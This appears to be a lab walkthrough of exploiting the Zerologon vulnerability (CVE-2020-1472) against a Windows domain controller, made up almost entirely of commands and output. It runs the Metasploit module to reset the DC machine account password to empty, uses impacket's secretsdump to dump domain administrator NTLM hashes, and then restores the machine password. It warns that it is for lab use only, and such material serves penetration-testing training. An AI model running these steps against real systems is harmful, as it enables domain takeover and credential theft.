Only use this for a lab, as it will break replication with the DC you target. You can put the computer password back, rerun python secretsdump.py but with an account belonging to the domain admins group, to see the original computer account for the DC you targeted.

Using MSF https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/auxiliary/admin/dcerpc/cve_2020_1472_zerologon.rb

msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > check

[*] 192.168.68.220: - Connecting to the endpoint mapper service...
[*] 192.168.68.220:49667 - Binding to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.68.220[49667] ...
[*] 192.168.68.220:49667 - Bound to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.68.220[49667] ...
[+] 192.168.68.220 - The target is vulnerable.



msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set rhosts 192.168.68.220
rhosts => 192.168.68.220
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set NBNAME WIN-USRJM2Q57MD
NBNAME => WIN-USRJM2Q57MD
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) >
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) >
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > run
[*] Running module against 192.168.68.220

[*] 192.168.68.220: - Connecting to the endpoint mapper service...
[*] 192.168.68.220:49667 - Binding to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.68.220[49667] ...
[*] 192.168.68.220:49667 - Bound to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.68.220[49667] ...
[+] 192.168.68.220:49667 - Successfully authenticated
[+] 192.168.68.220:49667 - Successfully set the machine account (WIN-USRJM2Q57MD$) password to: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 (empty)
[*] Auxiliary module execution completed




root@kali:~/Documents/impacket/examples# python secretsdump.py -just-dc -no-pass 'WIN-USRJM2Q57MD$'@192.168.68.220
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


---------------------------------------------

Restoring the DC computer password, so the DC can once more replicate with the other DC's.

Rerun secretsdump.py with DA account which has the privileges to reveal the plain_password_hex for the DC's computer account.

python3 secretsdump.py -hashes :fc525c9683e8fe067095ba2ddc971889 'DA'@192.168.68.220

plain_password_hex:6740dcca8389698eb0bb1e90481d76c97a4c80c1397f4f42161dbe11726a4d82ceca6bc870e4e744cf0892253b461b28e6e4f9b2fc7e2bf2d8d6083d3b59830f0790b496328f818f019771eb392c9af051bcd6bd8f4c149aabb5f9316c70c7ef2b57ba781ee283026bf3d7a3dea796efc603a24b917e7fcf76fd77bafac9b348d18945afee9e5ca61ac2b19cb717dac295ea2f26a067f12df94c1c73b7aaae399ac9f5924c6368c84f46604269c4b5deae1169e89718a094967440377122c0730f2d283e524161aafe0db0cdb1ebf331d2efec0c5beef45464ca2876e845d03c59b2d2d9bde4a5ff755e0fbe9428b490

Which you can use to place the restore back to the machine account.

msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set action RESTORE
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set password 6740dcca8389698eb0bb1e90481d76c97a4c80c1397f4f42161dbe11726a4d82ceca6bc870e4e744cf0892253b461b28e6e4f9b2fc7e2bf2d8d6083d3b59830f0790b496328f818f019771eb392c9af051bcd6bd8f4c149aabb5f9316c70c7ef2b57ba781ee283026bf3d7a3dea796efc603a24b917e7fcf76fd77bafac9b348d18945afee9e5ca61ac2b19cb717dac295ea2f26a067f12df94c1c73b7aaae399ac9f5924c6368c84f46604269c4b5deae1169e89718a094967440377122c0730f2d283e524161aafe0db0cdb1ebf331d2efec0c5beef45464ca2876e845d03c59b2d2d9bde4a5ff755e0fbe9428b490

